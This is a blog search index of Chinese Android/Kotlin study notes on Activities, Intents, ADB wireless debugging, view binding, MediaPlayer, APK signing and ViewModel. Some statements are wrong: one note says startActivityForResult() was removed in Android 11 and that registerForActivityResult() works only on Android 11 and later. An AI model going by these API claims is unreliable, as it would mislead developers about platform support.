<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>5开发原则</title>
    <url>/posts/bd59f981/</url>
    <content><![CDATA[SOLIDSingle responsibility 单一职责Open close principle 开闭原则Lisk of substitution 替换原则（能被子类替代使用）Interface segregation 接口隔离Dependences 依赖抽象而不是具体
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>0xffffffff颜色值是怎么读的</title>
    <url>/posts/5c4b5651/</url>
    <content><![CDATA[平常看到的大多数是十六进制的，#f5f5f5。
但是在自定义控件的时候，有些地方使用了像0xffffffff，这些设置颜色，在百度给的也不太明确，后来查找发现，原来是
在C语言中十六进制数必需以0x开头，以0x开头的数即表明它是一个十六进制的数，真正的数是0x后的值，所以，这种颜色值，0x不用管，接着的两位数ff是表示透明度，再接着的六位数就是平常看的#ffffff了。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Activity启动模式</title>
    <url>/posts/49b5653f/</url>
    <content><![CDATA[Activity有四种启动模式你可以在AndroidManifest.xml中通过给&lt;activity&gt;标签指定android:launchMode来选择启动模式
standard他是默认的启动模式，在不进行显示指定的情况下，会自动使用这种启动模式。他的操作就是，每次启动一个新的activity都会直接调用onCreate()创建一个新的实例，然后置于返回栈栈顶。这样的确定是，即便是同一个页面，也可能会产生很多个，然后叠加，产生资源的浪费。
singleTop解决标准模式的部分问题：他的操作为：在启动Activity时，如果发现该Activity已经处于栈顶时，系统将会直接使用它，而不是创建新的Activity实例。当然，如果栈顶换了新的activity时，他就会是标准模式。
singleTask这里的启动模式意味着，该Activity是一个单例模式，在整个返回栈中都只会有这一个。操作：当启动这个Activity时，系统会检查返回栈中是否存在这个Activity的实例，如果不存在，将会创建该实例，如果存在，那么系统会将返回栈中这个Activity之上的所有activity都出栈并销毁，使这个Activity处于栈顶。
singleInstance他的使用场景：存在多个应用程序都可以共用这个Activity，而前三个启动模式都做不到，因为每个应用程序都有自己的返回栈，同一个Activity在不同的返回栈时，必然会创建不同的实例。因此该启动方式会有一个单独的返回栈来管理这个Activity。不管哪个应用访问这个Activity都会公用这个返回栈。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>ADB 调试手机的三种方式（USB、WLAN、WIFI）</title>
    <url>/posts/b47efec3/</url>
    <content><![CDATA[主要是，家里多了一些旧手机时，可以用这些旧手机来开发App，可是这些手机Android版本过低，只有USB调试，不支持无限调试。所以可以通过这种方式打开无限调试的开关。来达到无限调试的目的。
USB 调试手机开启开发者选项和 USB 调试模式（通常开启方式：在关于手机连续点击7次版本号）；USB 连接线和各种接口正常（个别三方数据线仅支持充电，不支持调试）；驱动状态正常（Linux 和 Mac 通常没有问题，Windows 可能需要安装）；adb devices -l命令查看。
WLAN 调试（Android 10 及更低版本，需要借助 USB）Android 10以及更低的版本，必须通过 USB 连接后，才可实现同一 WLAN 下无线调试。
手机和电脑需连接在同一 WiFi 下；手机开启开发者选项和 USB 调试模式，并通过 USB 连接电脑（即adb devices -l可以查看到手机）；设置手机的监听adb tcpip 5555;拔掉 USB 线，找到手机的 IP 地址;通过 IP 连接到手机adb connect ip（端口默认：5555）;adb devices -l命令查看。
Wi-Fi 调试（Android 11 及更高版本，无需借助 USB）从 Android 11 开始支持 ADB 以无线方式连接手机调试，可以彻底摆脱 USB 线。
手机和电脑需连接在同一 WiFi 下；保证 SDK 为最新版本（adb –version ≥ 30.0.0）；手机启用开发者选项和无线调试模式（会提示确认）；允许无线调试后，选择使用配对码配对。记下显示的配对码、IP 地址和端口号；运行adb pair ip:port，使用第 4 步中的 IP 地址和端口号；根据提示，输入第 3 步中的配对码，系统会显示一条消息，表明您的设备已成功配对；（仅适用于 Linux 或 Windows）运行 adb connect ip:port。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>adb调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity更替（视图绑定）</title>
    <url>/posts/81c5b9b9/</url>
    <content><![CDATA[
kotin已经是google官宣的第一android开发语言。在android开发中，经常需要在activity中去获取某个具体的View属性，一般可以通过findViewById(R.id.button1)的方法来获取View，从而实现具体的逻辑变化。

但是一直使用findViewById()非常不利于代码的整洁性和可观性，因此可以采用视图绑定的方法来简化操作。


在原先的kotlin开发中，他可以通过插件apply plugin: &#39;kotlin-android-extensions&#39;已经被弃用来实现简单的视图绑定。现在这个插件已经被废除，需要使用其他方法



视图绑定在app目录下的build.gradle配置文件中填入一下内容

android &#123; ... viewBinding &#123; enabled = true &#125; &#125;
然后就可以便携的在activity中使用视图绑定
override fun onCreate(savedInstanceState: Bundle?) &#123;    super.onCreate(savedInstanceState)    binding = ActivityMainBinding.inflate(layoutInflater)//ActivityMainBinding是你的类的，layoutInflater是你需要绑定的视图，    setContentView(binding.root)	binging.button1.setClick&#123;		...	&#125;&#125;
完成视图绑定后，可以直接通过bingding.属性来获取属性并实现逻辑功能。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity生命周期</title>
    <url>/posts/b44bf942/</url>
    <content><![CDATA[返回栈
Activity是可层叠的，每启动一个新的Activity，都会覆盖在原Activity中。然后每次点击返回时，都会销毁掉最上面的Activity。下面的Activity就会重新显示是出来。

Activity状态
运行状态当一个Activity位于返回栈的栈顶时，Activity就处于运行状态。系统最不愿意回收的就是处于运行状态的Activity，因为这会带来非常差的用户体验。
暂停状态当一个Activity不再处于栈顶位置，但仍然可见时，Activity就进入了暂停状态。你可能会觉得，既然Activity已经不在栈顶了，怎么会可见呢？这是因为并不是每一个Activity都会占满整个屏幕，比如对话框形式的Activity只会占用屏幕中间的部分区域。处于暂停状态的Activity仍然是完全存活着的，系统也不愿意回收这种Activity（因为它还是可见的，回收可见的东西都会在用户体验方面有不好的影响），只有在内存极低的情况下，系统才会去考虑回收这种Activity。
停止状态当一个Activity不再处于栈顶位置，并且完全不可见的时候，就进入了停止状态。系统仍然会为这种Activity保存相应的状态和成员变量，但是这并不是完全可靠的，当其他地方需要内存时，处于停止状态的Activity有可能会被系统回收。
销毁状态一个Activity从返回栈中移除后就变成了销毁状态。系统最倾向于回收处于这种状态的Activity，以保证手机的内存充足。

生命周期
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity最佳实践</title>
    <url>/posts/fb710795/</url>
    <content><![CDATA[知晓当前时哪一个activity直接创建一个kotlin的类，，他与Activity的创建方法不一样。创建BaseActivity类
open class BaseActivity:AppCompatActivity() &#123;    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        Log.d(&quot;BaseActivity&quot;,javaClass.simpleName)        //javaClass表示获取当前实例的class对象，相当于在java中调用getClass方法        //::class.java表示获取BaseActivity类的Class对象。相当于在Java中调用BaseActivity.class反射        ActivityCollector.addActivity(this)    &#125;
然后在把其他的类从继承AppCompatActivity改为BaseActivity。这样，每个Activity在启动时，都会继承父类的方法，然后输出他的类名。就可以知晓当前是哪个Activity
随时随地退出程序//所有activity的集合//单例模式object ActivityCollector&#123;    private val actvities = ArrayList&lt;Activity&gt;()    fun addActivity(activity: Activity)&#123;        actvities.add(activity)    &#125;    fun removeActivity(activity: Activity)&#123;        actvities.remove(activity)    &#125;    fun finishAll()&#123;        for(activity in actvities)&#123;            if (!activity.isFinishing)                activity.finish()        &#125;        actvities.clear()    &#125;&#125;
调用这个单例，在每个onCreate()方法执行时，调用addActivity()，然后在每个onDestroy()方法中，调用removeActivity()方法。然后可以绑定一个案件绑定finishAll()一次性关闭所有的Activity。
启动Activity的最佳写法一般启动Activity的方法，就是通过调用startActivity()或者startforResult()来将Activiyty启动起来。但如果启动另一个Activity需要传入参数的话，往往需要查看文档或者问其开发人员。而这就会降低效率。这里推荐到最佳写法就是将启动类封装在一个kotlin的伴生类中，（类似静态方法)。
class ActivitySecond : BaseActivity() &#123;    companion object&#123;        fun actionStart(context: Context,data1:String,data2:String)&#123;            val intent = Intent(context,ActivitySecond::class.java)            intent.putExtra(&quot;data1&quot;,data1)            intent.putExtra(&quot;data2&quot;,data2)            context.startActivity(intent)        &#125;    &#125;&#125;
然后在需要启动ActivitySecond的地方，调用该方法。
ActivitySecond.actionStart(this,&quot;data1&quot;,&quot;data2&quot;)
来启动这个方法。这样就把上下文参数和数据都传过去了。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity的使用（1）</title>
    <url>/posts/115e430b/</url>
    <content><![CDATA[Activity的概念他是一种可以包含用户组界面的组件。他就是一个app的门面，所有可见的内容都是在activity中定义的。
相关配置每个Activity都需要绑定一个布局文件layout以及必须在AndroidManifest注册。

在layout布局文件中，每个元素都应该有一个唯一的id作为标识符。例如：&lt;Button androd:id=&quot;@+id/button1&quot;&gt;&lt;/Button&gt;
这种特殊的id命名方法，当去掉+号，即@id/button1，就是在xml中引入资源的语法。如果你需要在xml中定义一个id就需要使用@+id&#x2F;id_name这中语法。
在activity中绑定这个layout文件，只需要使用setContentView(R.layout.first_layout)//R.layout.first_layout是activity实例调用xml资源的书写方法，他采用.的方式来获取
通过setContenView来绑定这个布局文件
在AndroidManifest中注册这个activity&lt;activity android:name=&quot;.FirstActivity&quot;	android:label=&quot;This is FirstActivity&quot;&gt;	&lt;intent-filter&gt;		&lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;&lt;/action&gt;		&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;&lt;/category&gt;	&lt;/intent-filter&gt;&lt;/activity&gt;
在上述配置文件中


内容
解释



name
用来唯一的标识某个activity。


lable
如果具体的activity设置了lable，那么视图部分将会展现activity内的lable，不然就会默认展示aplication的lable


intent-filter
用来添加额外的属性


action
表明该类会响应什么样的启动事件


catogory
表明这个activity更加具体的响应类型




在这个实际的activity中，action和category用来表明这个实体类为启动类以上配置完成后，就完成了最基本的配置内容了
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity的跳转</title>
    <url>/posts/a4e34b71/</url>
    <content><![CDATA[activity的销毁只要调用finish()方法即可销毁activity。
Intentintent是Android程序中各组件之间进行交互的一种重要方式，不仅可以指定当前组件要执行的动作，也可以在不同组件传递数据。
activity的跳转
显式跳转，直接确定跳转的类，然后进行跳转
隐式跳转，设定好被跳转activity的响应事件和类别，然后通过触发对应的intent和category进行跳转。


显示跳转Intent有很多构造参数，这里我们选用一个Intent(Context packageContext,Class&lt;?&gt; cls)第一个参数需要一个启动的上下文，而我们的Activity实例就是一个context。第二个参数就是要跳转的目的类（他需要接受一个java的类）例如：button1.setOnClickListenner&#123;	val intent = Intent(this,SecondActivity::class.java)	//先构造一个intent	startActivity(intent)	//通过这个intent启动一个Activity&#125;
隐式跳转隐式跳转并不需要指定想要启动哪一个类，而是指定了一些列更为抽象的action和category等信息，然后交由系统分析。一般通过在AndroidManifest.xml中添加一个&lt;intent-filter&gt;&lt;/intent-filter&gt;标签来实现。例如：&lt;activity android:name=&quot;.SecondActivity&quot;&gt;	&lt;intent-filter&gt;		&lt;action android:name=&quot;top.zfxt.activitytest.ACTION_START&quot;&gt;&lt;/action&gt;		&lt;category android:name=&quot;android.intent.category.DEFAULT&quot;&gt;&lt;/category&gt;	&lt;/intent-filter&gt;&lt;/activity&gt;
以上内容表示该类会接受一个ACTION_START的启动事件，而且会有一个默认的category，这是所有启动事件都有的默认的启动参数。然后需要启动这个类的话button1.setOnClickListenner&#123;	val intent = Intent(&quot;top.zfxt.activitytest.ACTION_START&quot;)	startActivity(intent)&#125;
如此就可以实现隐式跳转

更多intent的用法1. 每个intent只能指定一个action，但是可以指定多个category。因此通过category来实现具体跳转的activity。

例如：在AndroidManifest.xml中添加&lt;category android:name=&quot;top.zfxt.activitytest.MY_CATEGORY&quot;&gt;然后在实例中intent.addCategory(&quot;top.zfxt.activitytest.MY_CATEGORY&quot;)之后才能正确跳转。    2. 隐式Intent，不仅可以启动自己程序内的Activity，还能启动其他程序的Activity，这使得多个应用程序共享之间的功能成为可能。继续使用上面的button1作为示例：
button1.setOnClickListener&#123;	val intent = Intent(Intent.ACTION_VIEW)	intent.data = Uri.parse(&quot;https://www.baidu.com&quot;)	startActivity(intent)&#125;
以上内容指定了action是Intent.ACTION_VIEW,然后通过Uri.parse()方法将地址字符解析成一个Uri对象，然后传递给intent.data。与此相对应的，在标签中也可以在配置一个对象，包含以下内容



标签
注释



android:scheme
用于指定数据的协议部分，如：https


android:host
用于指定数据的主机名


android:port
用于指定数据的端口部分


android:path
用于指定访问的具体资源路径


android:mimeType
用于指定可以处理的数据类型，支持用通配符的方式


上述Intent.ACTION_VIEW是可以调用浏览器的一个启动事件，当然我们也可以自己定义一个activity，用隐式intent的方式，去接受这个启动事件，但我们不一定能够解析他，只是调用而已。类似的还有Intent.ACTION_DIALtel:10086这一串数据可以调用电话簿，并且拨打电话给10086。
传递数据
向下一个activity传递数据
button1.setOnClickListenner&#123;	val intent = Intent(this,SecondActivity::class.java)	intent.putExtra(&quot;extra_data&quot;,&quot;This is a Test&quot;)	startActivity(intent)&#125;
通过重载putExtra()方法，将内容暂存到intent中，然后通过键值对取出该数据。然后在另一个被启动的activity中取出数据
onCreate(savedInstanceState:Bundle?)&#123;	...	val extraData = intent.getStringExtra(&quot;extra_data&quot;)	Log.d(&quot;SecondActivity&quot;,&quot;extra data is $extraData&quot;)&#125;
通过getStringExtra()方法获取相应的键值，同理，对应的数据类型采用相应的方法如getIntExtra(),getBooleanExtra()等

返回数据给上一个activity

startActivityForResult()主要是这个方法，但是这个方法已经弃用，等我学了新的再来补充。




registerForActivityResult()在 Android 开发中，startActivityForResult() 方法在 Android 10（API 级别 29）中已被弃用，而且在 Android 11（API 级别 30）及更高版本中已完全移除。代替它的方法是使用 registerForActivityResult()。这个新的 API 提供了更加简洁和灵活的方式来处理活动返回结果。

下面是详细的步骤来使用 registerForActivityResult()：
步骤 1：在 Activity 或 Fragment 中定义一个 ActivityResultLauncher 对象。
private lateinit var someActivityResultLauncher: ActivityResultLauncher&lt;Intent&gt;
步骤 2：在 onCreate() 方法中，为 ActivityResultLauncher 对象赋值并指定回调逻辑。
someActivityResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) &#123; result -&gt;    // 在这里处理活动返回的结果    if (result.resultCode == Activity.RESULT_OK) &#123;        // 处理成功的逻辑        val data: Intent? = result.data        // 从 data 中获取数据    &#125; else &#123;        // 处理失败的逻辑    &#125;&#125;
步骤 3：在需要启动另一个活动的地方，使用 someActivityResultLauncher 启动活动。
val intent = Intent(this, AnotherActivity::class.java)someActivityResultLauncher.launch(intent)

步骤 4：在另一个活动中，当需要返回结果时，使用 setResult() 方法设置结果并关闭活动。
val resultIntent = Intent()resultIntent.putExtra(&quot;key&quot;, value)setResult(Activity.RESULT_OK, resultIntent)finish()
这就是使用 registerForActivityResult() 方法来替代 startActivityForResult() 的基本步骤。现在，让我们来看一个完整的示例：
class MainActivity : AppCompatActivity() &#123;    private lateinit var someActivityResultLauncher: ActivityResultLauncher&lt;Intent&gt;    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_main)        someActivityResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) &#123; result -&gt;            if (result.resultCode == Activity.RESULT_OK) &#123;                val data: Intent? = result.data                val value = data?.getStringExtra(&quot;key&quot;)                // 处理返回的结果            &#125; else &#123;                // 处理失败的逻辑            &#125;        &#125;        val button = findViewById&lt;Button&gt;(R.id.button)        button.setOnClickListener &#123;            val intent = Intent(this, AnotherActivity::class.java)            someActivityResultLauncher.launch(intent)        &#125;    &#125;&#125;class AnotherActivity : AppCompatActivity() &#123;    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_another)        val button = findViewById&lt;Button&gt;(R.id.button)        button.setOnClickListener &#123;            val resultIntent = Intent()            resultIntent.putExtra(&quot;key&quot;, &quot;Some data&quot;)            setResult(Activity.RESULT_OK, resultIntent)            finish()        &#125;    &#125;&#125;
在这个示例中，点击 MainActivity 中的按钮会启动 AnotherActivity，然后 AnotherActivity 在返回结果之前关闭自身并设置了返回结果。MainActivity 中的 someActivityResultLauncher 的回调函数会在返回结果时被触发，你可以在回调函数中处理返回的结果数据。
这就是使用 registerForActivityResult() 方法来代替 startActivityForResult() 的详细说明和示范。请注意，这个新的 API 仅适用于 Android 11 及更高版本，如果你的目标是更早版本的 Android，则需要考虑其他替代方案。

startActivityForResult()在android10之前任然是使用这个方法的，所以该学还得学。使用：button1.setOnClickListenner&#123;	val intent = Intent(this,SecondActvity::class.java)	startActivityForResult(intent,1)&#125;
被执行的类放入数据：class SecondActivity&#123;	...	val intent = Intent()	intent.putExtra(&quot;data_return&quot;,&quot;Hello FirstActivity&quot;)	setResult(RESUILT_OK,intent)	finish()	//手动销毁activity&#125;
回调函数：因为使用的是startActiityForResult()方法，因此，SecondActivity被销毁后，会回调上一个Activity的onActivityResult()方法，因此我们需要重写这个方法来获得数据override fun onActivityResult(requestCode:Int, resultCode:Int, data: Intent?)&#123;	super.onActivityResult(requestCode,resultCode,data)	when(requestCode)&#123;		1 - &gt; if(resultCode == RESULT_OK)&#123;		val returnedData = data?.getStringExtra(&quot;data_return&quot;)		Log.d(&quot;FirstActivity&quot;,&quot;returned data is $returnedData&quot;)		&#125;	&#125;&#125;
onActivityResult()方法有三个参数，第一个requestCode,即我们请就是传入的请求码。第二个resultCode即返回时的处理结果，第三个参数data即携带数据的Intent。

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity被回收</title>
    <url>/posts/4dca68be/</url>
    <content><![CDATA[一般情况下，只有activity被销毁后才hi被回收。可是，当系统内存不足时，他会将处于停止状态的activity也回收了。如果停止状态的activity没被回收，那么再次启动时，将会执行onRestart()方法，然后恢复数据，但是如果被回收后，他会执行onCreate()方法，也就导致，如果这个activity有文本输入框的话，这些数据都会直接消失。
因此为了解决这个问题，Activity提供了一个onSaveInstanceState()回调方法。他在回收前一点会调用该方法。该方法需要一个Bundle参数，也可以用put之类的保存键值对参数。如下代码：
override fun onSaveInstanceState(outState: Bundle)&#123;	super.onSaveInstanceState(outState)	val tempData = &quot;Something you just typed&quot;	outState.putString(&quot;data_key&quot;,tempData)&#125;
数据已经保存了，然后恢复的话，需要修改onCreate()的内容
override fun onCreate(savedInstanceState:Bundle?)&#123;	super.onCreate(savedInstanceState)	Log.d(tag,&quot;On Create&quot;)	if(savedInstanceState != null)&#123;		val tempDta = saveInstanceState.getString(&quot;data_key&quot;)		Log.d(tag,teamData)	&#125;&#125;]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android 13（API 33）读写SD卡权限的调整适配</title>
    <url>/posts/9283408d/</url>
    <content><![CDATA[Android 13（API 33）读写SD卡权限的调整适配在Android13前读取SDcard 的内容只需要一个权限：
android.permission.READ_EXTERNAL_STORAGE
但是在Android 13以后这个权限被细化成了三个：
public static final String READ_MEDIA_AUDIO = &quot;android.permission.READ_MEDIA_AUDIO&quot;;public static final String READ_MEDIA_IMAGES = &quot;android.permission.READ_MEDIA_IMAGES&quot;;public static final String READ_MEDIA_VIDEO = &quot;android.permission.READ_MEDIA_VIDEO&quot;;
如果是升级Android13之前就已经具有读写SDK的权限，那么升级到13之后，自己具有上述三个权限。
如果是升级Android13之后新装的应用，并且targetSDK小于33，则申请READ_EXTERNAL_STORAGE权限时，会自动转化为对上述三个权限的申请，权限申请框只一个如果是升级Android13之后新装的应用，并且targetSDK大于等于33，则申请READ_EXTERNAL_STORAGE权限时会自动拒绝（同理WRITE_EXTERNAL_STORAGE也是一样）。必须申请上面三个权限才可以。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Ajax、XHR、Fetch、Axios 关键图解</title>
    <url>/posts/c0b28004/</url>
    <content><![CDATA[关键图解
Ajax全称（Asynchronous JavaScript And XML）

Ajax 是一个技术统称，是一个概念模型，它囊括了很多技术，并不特指某一技术，它很重要的特性之一就是让页面实现局部刷新。他可以局部刷新页面，不用重载整个页面。

XHRXHR(XmlHttpRequest)是一种用来实现Ajax的方法示例：
&lt;body&gt;  &lt;script&gt;    function ajax(url) &#123;      const xhr = new XMLHttpRequest();      xhr.open(&quot;get&quot;, url, false);      xhr.onreadystatechange = function () &#123;        // 异步回调函数        if (xhr.readyState === 4) &#123;          if (xhr.status === 200) &#123;            console.info(&quot;响应结果&quot;, xhr.response)          &#125;        &#125;      &#125;      xhr.send(null);    &#125;    ajax(&#x27;https://smallpig.site/api/category/getCategory&#x27;)  &lt;/script&gt;&lt;/body&gt;
注意：我们使用这种方式实现网络请求时，如果请求内部又包含请求，以此循环，就会出现回调地狱，这也是一个诟病，后来才催生了更加优雅的请求方式。
Fetch
Fetch 是一个 API，它是真实存在的，它是基于 promise 的。


使用 promise，不使用回调函数。
采用模块化设计，比如 rep、res 等对象分散开来，比较友好。
通过数据流对象处理数据，可以提高网站性能。&lt;body&gt;  &lt;script&gt;    function ajaxFetch(url) &#123;      fetch(url).then(res =&gt; res.json()).then(data =&gt; &#123;        console.info(data)      &#125;)    &#125;    ajaxFetch(&#x27;https://smallpig.site/api/category/getCategory&#x27;)  &lt;/script&gt;&lt;/body&gt;

Axois
他是一个封装库，是基于XHR来实现的。
从浏览器中创建 XMLHttpRequests
从 node.js 创建 http 请求
支持 Promise API（异步请求时会返回Promise）
拦截请求和响应
转换请求数据和响应数据
取消请求
自动转换 JSON 数据
客户端支持防御 XSRF// 发送 POST 请求axios(&#123;    method: &#x27;post&#x27;,    url: &#x27;/user/12345&#x27;,    data: &#123;        firstName: &#x27;Fred&#x27;,        lastName: &#x27;Flintstone&#x27;    &#125;&#125;)

引用自知乎



]]></content>
      <tags>
        <tag>vue</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>Android MediaPlayer</title>
    <url>/posts/e3e66d1f/</url>
    <content><![CDATA[这是MediaPlayer的关键生命周期，这张图是关键，他可以帮你很好的理解如何使用MediaPlayer![](https://image.zfxt.top/hexo-blog/Android MediaPlayer-2023-12-23-24-02.png)
MediaPlayer的常用方法
| Public Methods || — | — || static MediaPlayer | create(Context context, Uri uri, SurfaceHolder holder)指定从资源ID对应的资源文件中来装载音乐文件，同时指定了SurfaceHolder对象并返回MediaPlyaer对象。 || static MediaPlayer | create(Context context, int resid)指定从资源ID对应的资源文件中来装载音乐文件，并返回新创建的MediaPlyaer对象。 || static MediaPlayer | create(Context context, Uri uri)从指定Uri装在音频文件，并返回新创建的MediaPlayer对象。 || int | getCurrentPosition()获取当前播放的位置。 || int | getDuration()获取音频的时长。 || int | getVideoHeight()获取视频的高度。 || int | getVideoWidth()获取视频的宽度。 || boolean | isLooping()判断MediaPlayer是否正在循环播放。 || boolean | isPlaying()判断MediaPlayer是否正在播放。 || void | pause()暂停播放。 || void | prepare()准备播放（装载音频），调用此方法会使MediaPlayer进入Prepared状态。 || void | prepareAsync()准备播放异步音频。 || void | release()释放媒体资源。 || void | reset()重置MediaPlayer进入未初始化状态。 || void | seekTo(int msec)寻找指定的时间位置。 || void | setAudioStreamType(int streamtype)设置音频流的类型。 || void | setDataSource(String path)指定装载path路径所代表的文件。 || void | setDataSource(Context context, Uri uri, Map&lt;String, String headers)指定装载uri所代表的文件。 || void | setDataSource(Context context, Uri uri)指定装载uri所代表的文件。 || void | setDataSource(FileDescriptor fd, long offset, long length)指定装载fd所代表的文件中从offset开始长度为length的文件内容。 || void | setDataSource(FileDescriptor fd)指定装载fd所代表的文件。 || void | setDisplay(SurfaceHolder sh)设置显示方式。 || void | setLooping(boolean looping)设置是否循环播放。 || void | setNextMediaPlayer(MediaPlayer next)设置当前流媒体播放完毕,下一个播放的MediaPlayer。 || void | setOnBufferingUpdateListener(MediaPlayer.OnBufferingUpdateListener listener)注册一个回调函数,在网络视频流缓冲变化时调用。 || void | setOnCompletionListener(MediaPlayer.OnCompletionListener listener)为Media Player的播放完成事件绑定事件监听器。 || void | setOnErrorListener(MediaPlayer.OnErrorListener listener)为MediaPlayer的播放错误事件绑定事件监听器。 || void | setOnPreparedListener(MediaPlayer.OnPreparedListener listener)当MediaPlayer调用prepare()方法时触发该监听器。 || void | setOnSeekCompleteListener(MediaPlayer.OnSeekCompleteListener listener)当MediaPlayer调用seek()方法时触发该监听器。 || void | setOnVideoSizeChangedListener(MediaPlayer.OnVideoSizeChangedListener listener)注册一个用于监听视频大小改变的监听器。 || void | setScreenOnWhilePlaying(boolean screenOn)置是否使用SurfaceHolder来显示。 || void | setSurface(Surface surface)设置Surface。 || void | setVideoScalingMode(int mode)设置视频缩放的模式。 || void | setVolume(float leftVolume, float rightVolume)设置播放器的音量。 || void | setWakeMode(Context context, int mode)为MediaPlayer设置低级电源管理行为。. || void | start()开始或恢复播放。 || void | stop()停止播放。 |
这是我的写法：
class AudioPlayerImpl(    private val app: Application) : AudioPlayer &#123;    private var _mediaPlayer: MediaPlayer? = null    override fun play(uri: String?) &#123;        if (_mediaPlayer == null) &#123;            _mediaPlayer = MediaPlayer().apply &#123;                setDataSource(app, android.net.Uri.parse(uri))                prepare()                start()            &#125;        &#125; else &#123;            uri?.let &#123;                release()                _mediaPlayer = MediaPlayer().apply &#123;                    setDataSource(app, android.net.Uri.parse(uri))                    prepare()                &#125;            &#125;            _mediaPlayer?.apply &#123;                start()            &#125;        &#125;    &#125;    override fun pause() &#123;        _mediaPlayer?.pause()    &#125;    override fun release() &#123;        _mediaPlayer?.stop()        _mediaPlayer?.release()        _mediaPlayer = null    &#125;&#125;


引用自csdn

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>MediaPlayer</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Studio 打包APK</title>
    <url>/posts/f5b9a2a4/</url>
    <content><![CDATA[
当你开发完一个App项目后，你所运行生成的都是debug的安装包，也就是无法正常安装，只能在开发者模式下调试使用。![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-20-38-51.png)

如果要查看这些隐藏的文件夹，需要打开设置![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-20-40-04.png)


打包过程，进入build![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-04-49-19.png)![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-04-08-07.png)![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-22-44-03.png)这里需要一个商店的key，因为没有，所以创建一个新的，点击Create new…![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-22-57-47.png)首先指明生成的jks文件的路径，点击这个文件夹图标。![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-18-56-53.png)我个人习惯放在D盘的APK目录下，然后命名jks的名称为GenerateAPK，然后点击OK。![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-22-37-04.png)然后输入这个jks和别名的一些相关信息，上方的商店密码和别名密码可以设置为一样的，这样便于记忆，只不过安全系数就降低了。我上面设置的是123456，信息都设置好了之后，点击OK。


![](https://image.zfxt.top/hexo-blog/Android Studio 打包APK-2023-10-04-26-34.png)
这里勾选上记住密码。当你看到屏幕的右下角出现这个提示时，说明你的APK已经生成了，你可以在你的app下看到多了一个release的文件夹，里面就是app-release.apk包，下面你可以复制发到手机上，然后下载，手机上是可以安装的。

该文章引用自(CSDN)[https://blog.csdn.net/qq_38436214/article/details/112288954]

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>APK打包</tag>
        <tag>android Studio</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 中 Bitmap 和 Drawable 相互转换的方法</title>
    <url>/posts/b77305e8/</url>
    <content><![CDATA[
drawable转为bitmap其中的appcontext可以是activity的context属性也可以是全局的appContextval music_default_art = BitmapFactory.decodeResource(appContext.resources,R.drawable.music_default)
bitmap转为drawableval drawable =  BitmapDrawable(bmp)

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android(Jetpack)</title>
    <url>/posts/1941ba40/</url>
    <content><![CDATA[JetpackJetpack是一个开发组件工具集，它的主要目的是帮助我们编写出更加简洁的代码，并简化我们的开发过程。Jetpack中的组件有一个特点，它们大部分不依赖于任何Android系统版本，这意味着这些组件通常是定义在AndroidX库当中的，并且拥有非常好的向下兼容性。
MVVM架构ViewModelViewModel是可以帮助Activity分担一部分工作，它是专门用于存放与界面相关的数据的。只要是界面上能看得到的数据，它的相关变量都应该存放在ViewModel中，而不是Activity中，这样可以在一定程度上减少Activity中的逻辑。ViewModel还有一个非常重要的特性。我们都知道，当手机发生横竖屏旋转的时候，Activity会被重新创建，同时存放在Activity中的数据也会丢失。而ViewModel的生命周期和Activity不同，它可以保证在手机屏幕发生旋转的时候不会被重新创建，只有当Activity退出的时候才会跟着Activity一起销毁。导入外部依赖：implementation &quot;androidx.lifecycle:lifecycle-extensions:2.2.0&quot;
class MainViewModel : ViewModel() &#123;    var counter = 0&#125;...//Activity中 viewModel = ViewModelProvider(this)[MainViewModel::class.java]        binding.apply &#123;            plusOneBtn.setOnClickListener &#123;                viewModel.counter++                refreshCounter()            &#125;        &#125;    &#125;    private fun refreshCounter() &#123;        binding.infoText.text = viewModel.counter.toString()    &#125;
这一段的一个重点：我们不是创建一个viewModel实例，而是通过ViewModelProvider来获取ViewModel的实例.因为ViewModel有其独立的生命周期，并且其生命周期要长于Activity。
